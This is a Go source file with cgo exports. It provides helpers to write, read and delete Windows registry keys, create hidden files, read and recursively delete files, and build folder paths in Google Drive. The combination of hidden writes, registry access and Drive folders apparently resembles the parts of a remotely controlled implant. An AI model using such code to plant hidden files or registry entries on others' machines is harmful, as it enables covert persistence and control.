package main

/*
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
*/
import "C"

import (
	"io/ioutil"
	"os"
	"syscall"

	"golang.org/x/sys/windows/registry"

	"google.golang.org/api/drive/v3"

	"fmt"
	"strings"
)

func getGoCategory(category string) registry.Key {
	var goCategory registry.Key
	switch strings.ToLower(category) {
	case "classes_root":
		goCategory = registry.CLASSES_ROOT
	case "current_user":
		goCategory = registry.CURRENT_USER
	case "local_machine":
		goCategory = registry.LOCAL_MACHINE
	case "users":
		goCategory = registry.USERS
	case "current_config":
		goCategory = registry.CURRENT_CONFIG
	default:
		fmt.Println("Unsupported category")
	}
	return goCategory
}

func writeReg(category, path, key, value string) string {
	goCategory := getGoCategory(category)

	k, err := registry.OpenKey(goCategory, path, registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil {
		k, _, err = registry.CreateKey(goCategory, path, registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS)
		if err != nil {
			return err.Error()
		}
	}
	defer k.Close()

	err = k.SetStringValue(key, value)
	if err != nil {
		return err.Error()
	}
	return "Written"
}

func readReg(category, path, value string) (string, error) {
	goCategory := getGoCategory(category)
	k, err := registry.OpenKey(goCategory, path, registry.QUERY_VALUE|registry.WOW64_64KEY)
	if err != nil {
		return err.Error(), err
	}

	s, _, err := k.GetStringValue(value)
	if err != nil {
		return err.Error(), err
	}
	return s, nil
}

func delReg(category, path, value string) string {
	goCategory := getGoCategory(category)
	k := registry.DeleteKey(goCategory, path)

	if k != nil {
		return k.Error()
	}
	return "Deleted"
}

func writeFile(path, data string) string {
	if path[0:1] == "~" {
		home, _ := os.UserHomeDir()
		path = fmt.Sprint(home, path[1:])
	}

	spPath := strings.Split(path, "\\")
	fPath := strings.Join(spPath[:len(spPath)-1], "\\")
	err := os.MkdirAll(fPath, os.ModeDir)
	if err != nil {
		return fmt.Sprintf("MkDir Error: %s", err.Error())
	}

	if _, err := os.Stat(path); err == nil {
		return "Already exist"
	}

	f, err := os.Create(path)
	if err != nil {
		return fmt.Sprintf("Create Error: %s", err.Error())
	}
	defer f.Close()

	_, err = f.Write([]byte(data))
	if err != nil {
		return fmt.Sprintf("Write Error: %s", err.Error())
	}

	nameptr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		os.Remove(path)
		return fmt.Sprintf("Nameptr Error: %s", err.Error())
	}

	err = syscall.SetFileAttributes(nameptr, syscall.FILE_ATTRIBUTE_HIDDEN)
	if err != nil {
		os.Remove(path)
		return fmt.Sprintf("Attribute Error: %s", err.Error())
	}
	return "Written"
}

func readFile(path string) string {
	if path[0:1] == "~" {
		home, _ := os.UserHomeDir()
		path = fmt.Sprint(home, path[1:])
	}

	if data, err := ioutil.ReadFile(path); err != nil {
		return err.Error()
	} else {
		return string(data[:])
	}
}

func delFile(path string) string {
	if path[0:1] == "~" {
		home, _ := os.UserHomeDir()
		path = fmt.Sprint(home, path[1:])
	}

	resp := "Deleted"
	if err := os.RemoveAll(path); err != nil {
		resp = err.Error()
	}
	return resp
}

func checkPath(path string) string {
	srv := getSrv()

	folders := strings.Split(path, "/")[1:]
	root := true
	var prevFile = ""

	for _, folder := range folders {
		req := srv.Files.List().Q(`mimeType="application/vnd.google-apps.folder"`).
			Q(fmt.Sprintf(`name="%s"`, folder))

		l, err := req.Fields("files(id, parents)").Do()
		if err != nil {
			continue
		}

		changedFile := false
		for _, file := range l.Files {
			if root {
				prevFile = file.Id
				changedFile = true
				root = false
				break
			} else if len(file.Parents) > 0 && file.Parents[0] == prevFile {
				prevFile = file.Id
				changedFile = true
				break
			}
		}

		if !changedFile {
			_file := &drive.File{
				MimeType: "application/vnd.google-apps.folder", Name: folder}
			if prevFile != "" {
				_file.Parents = []string{prevFile}
			}

			newFile, err := srv.Files.Create(_file).
				Fields("id").Do()

			if err != nil {
				fmt.Println(err)
				break
			} else {
				prevFile = newFile.Id
			}
		}
	}

	return prevFile
}
